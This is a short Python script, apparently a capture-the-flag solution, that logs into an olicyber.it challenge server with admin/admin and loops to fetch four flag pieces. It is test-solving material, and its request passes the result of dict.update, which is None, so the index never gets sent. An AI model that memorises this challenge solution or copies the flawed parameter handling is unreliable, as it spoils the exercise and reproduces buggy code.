
import requests
import json

host='http://web-11.challs.olicyber.it/'
login_page='login'
flag_page='flag_piece'
data={'username':'admin', 'password':'admin'}
s = requests.Session()
x = s.post(host+login_page, json=data)

for i in range(4):
    data = x.json()
    print(data)
    x = s.get(host+flag_page, params=data.update({'index':str(i)}))
    print(x.json())
